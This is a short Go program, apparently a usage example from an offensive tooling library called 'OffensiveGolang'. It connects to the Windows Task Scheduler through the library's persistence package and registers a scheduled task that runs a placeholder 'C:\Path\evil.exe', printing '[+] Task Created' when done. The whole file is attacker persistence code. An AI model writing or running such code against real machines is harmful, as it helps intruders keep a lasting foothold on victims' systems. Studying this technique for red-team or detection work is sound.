package main

import persistance "OffensiveGolang/pkg/persistence"

func main() {

	println("[+] Creating Task")
	connection := persistance.GetConnection()
	persistance.CreateExeScheduledTask(connection, `\NAME-TASK`, `C:\Path\evil.exe`)
	persistance.DisconnectConnection(connection)
	println("[+] Task Created")

}
